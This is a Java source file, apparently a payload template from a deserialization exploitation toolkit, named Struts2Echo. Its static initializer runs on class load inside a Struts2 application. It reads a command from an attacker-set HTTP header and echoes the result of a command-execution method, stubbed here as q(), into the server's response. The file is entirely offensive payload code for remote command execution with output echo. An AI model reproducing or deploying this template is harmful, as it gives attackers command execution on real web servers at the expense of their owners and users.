package org.su18.ysuserial.payloads.templates.echo;

import com.opensymphony.xwork2.ActionContext;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * @author su18
 */
public class Struts2Echo {

	public static String CMD_HEADER;

	static {
		try {
			HttpServletRequest  request  = (HttpServletRequest) ActionContext.getContext().get("com.opensymphony.xwork2.dispatcher.HttpServletRequest");
			HttpServletResponse response = (HttpServletResponse) ActionContext.getContext().get("com.opensymphony.xwork2.dispatcher.HttpServletResponse");
			System.out.println(response);
			String              cmd      = request.getHeader(CMD_HEADER);

			response.getWriter().println(q(cmd));
			response.getWriter().flush();
		} catch (IOException ignored) {
		}
	}


	public static java.io.ByteArrayOutputStream q(String cmd) {
		return null;
	}

}
